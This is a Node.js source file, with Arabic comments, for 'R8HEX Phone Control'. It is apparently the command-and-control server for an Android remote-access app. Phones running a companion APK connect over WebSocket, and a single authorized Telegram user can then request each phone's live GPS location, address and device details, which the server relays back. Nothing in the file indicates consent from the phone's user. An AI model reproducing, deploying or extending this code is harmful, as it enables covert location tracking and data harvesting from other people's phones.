const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const http = require('http');
const { token, id } = require('./data');

const app = express();
const server = http.createServer(app);

// 🔧 استخدم polling عادي بدون webhook
const bot = new TelegramBot(token, { 
    polling: true 
});

// 🚀 WebSocket على نفس السيرفر
const wss = new WebSocket.Server({ 
    server: server,
    path: '/ws'
});

// تخزين البيانات
const connectedPhones = new Map();

// 🔧 middleware أساسي
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🏠 صفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>R8HEX Phone Control</title>
            <meta charset="utf-8">
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    max-width: 600px;
                    margin: 0 auto;
                }
                .status { 
                    color: #4CAF50; 
                    font-weight: bold;
                    font-size: 24px;
                }
                code {
                    background: rgba(0,0,0,0.3);
                    padding: 10px;
                    border-radius: 5px;
                    display: block;
                    margin: 10px 0;
                    word-break: break-all;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎮 R8HEX Phone Control System</h1>
                <p class="status">✅ السيرفر شغال بنجاح</p>
                <p>📱 الأجهزة المتصلة: <strong>${connectedPhones.size}</strong></p>
                <p>🌐 رابط WebSocket للـ APK:</p>
                <code>wss://bot-d4k2.onrender.com/ws</code>
                <p>📞 Chat ID: <strong>${id}</strong></p>
                <p>⚡ المطور: @A1BUG</p>
            </div>
        </body>
        </html>
    `);
});

// 🎯 معالج الأمر /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    // تحقق إذا المستخدم مسموح
    if (chatId.toString() !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت.');
    }
    
    const welcomeMessage = `
🎮 **R8HEX - نظام التحكم في الهاتف**

✅ **السيرفر شغال بنجاح!**
🌐 **رابط WebSocket للـ APK**:
\`wss://bot-d4k2.onrender.com/ws\`

📱 **أرسل هذا الرابط لملف الـ APK**

🔧 **الأوامر المتاحة**:
/info - معلومات الجهاز
/location - الموقع الحالي
/status - حالة الاتصال

⚡ **المطور**: @A1BUG
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// 📍 أمر الموقع
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت.');
    }
    
    const phone = connectedPhones.get(chatId);
    if (phone && phone.readyState === WebSocket.OPEN) {
        phone.send(JSON.stringify({
            type: 'command',
            command: 'get_location',
            chatId: chatId
        }));
        bot.sendMessage(chatId, '📍 جاري طلب الموقع من الهاتف...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل. تأكد من:\n1. تشغيل الـ APK\n2. إدخال الرابط الصحيح\n3. إرسال chatId الصحيح');
    }
});

// 📱 أمر معلومات الجهاز
bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك.');
    }
    
    const phone = connectedPhones.get(chatId);
    if (phone && phone.readyState === WebSocket.OPEN) {
        phone.send(JSON.stringify({
            type: 'command', 
            command: 'get_device_info',
            chatId: chatId
        }));
        bot.sendMessage(chatId, '📊 جاري طلب معلومات الجهاز...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل.');
    }
});

// 📊 أمر حالة الاتصال
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId !== id) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك.');
    }
    
    const phone = connectedPhones.get(chatId);
    const status = phone && phone.readyState === WebSocket.OPEN ? '✅ متصل' : '❌ غير متصل';
    
    bot.sendMessage(chatId, `📊 **حالة الاتصال**:
    
📱 الهاتف: ${status}
🔗 الاتصالات النشطة: ${connectedPhones.size}
🌐 السيرفر: https://bot-d4k2.onrender.com
    `, { parse_mode: 'Markdown' });
});

// 🔌 معالج اتصالات WebSocket
wss.on('connection', (ws, req) => {
    console.log('📱 هاتف جديد متصل من:', req.socket.remoteAddress);
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handlePhoneMessage(ws, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة الرسالة:', error);
        }
    });

    ws.on('close', () => {
        for (let [phoneId, connection] of connectedPhones.entries()) {
            if (connection === ws) {
                connectedPhones.delete(phoneId);
                console.log(`📱 الهاتف ${phoneId} انقطع`);
                
                // إعلام المستخدم
                if (phoneId === id) {
                    bot.sendMessage(phoneId, '📱 **انقطع الاتصال بالهاتف**');
                }
                break;
            }
        }
    });
});

// 📨 معالج رسائل الهاتف
function handlePhoneMessage(ws, message) {
    switch (message.type) {
        case 'register':
            // تسجيل الهاتف
            const chatId = message.chatId;
            connectedPhones.set(chatId, ws);
            console.log(`✅ هاتف مسجل للمستخدم: ${chatId}`);
            
            // إرسال تأكيد للمستخدم
            if (chatId === id) {
                bot.sendMessage(chatId, '✅ **تم الاتصال بالهاتف بنجاح!**\n\nيمكنك الآن استخدام الأوامر للتحكم في الهاتف.', { 
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [
                            ['/location', '/info'],
                            ['/status']
                        ],
                        resize_keyboard: true
                    }
                });
            }
            break;
            
        case 'location':
            bot.sendMessage(message.chatId, `
📍 **الموقع الحالي**:
🌍 الإحداثيات: ${message.lat}, ${message.lng}
🏠 العنوان: ${message.address || 'غير متوفر'}
📶 الدقة: ${message.accuracy || 'N/A'} متر
            `);
            
            // إرسال موقع على الخريطة إذا كانت الإحداثيات موجودة
            if (message.lat && message.lng) {
                bot.sendLocation(message.chatId, message.lat, message.lng);
            }
            break;
            
        case 'device_info':
            bot.sendMessage(message.chatId, `
📱 **معلومات الجهاز**:
📟 النموذج: ${message.model || 'غير معروف'}
🔢 الإصدار: ${message.version || 'غير معروف'} 
💾 الذاكرة: ${message.memory || 'غير معروف'}
🖥️ الشاشة: ${message.display || 'غير معروف'}
🔋 البطارية: ${message.battery || 'غير معروف'}
            `);
            break;
            
        case 'response':
            bot.sendMessage(message.chatId, `📨 ${message.text}`);
            break;
            
        default:
            console.log('📩 رسالة غير معروفة:', message);
    }
}

// 🚀 تشغيل السيرفر
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 R8HEX Server running on port ${PORT}`);
    console.log(`🤖 Bot: R8HEX_Bot`);
    console.log(`📱 WebSocket: wss://bot-d4k2.onrender.com/ws`);
    console.log(`🌐 Website: https://bot-d4k2.onrender.com`);
    console.log(`👤 Authorized User: ${id}`);
});

// 🔧 معالج الأخطاء
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ رفض غير معالج:', reason);
});
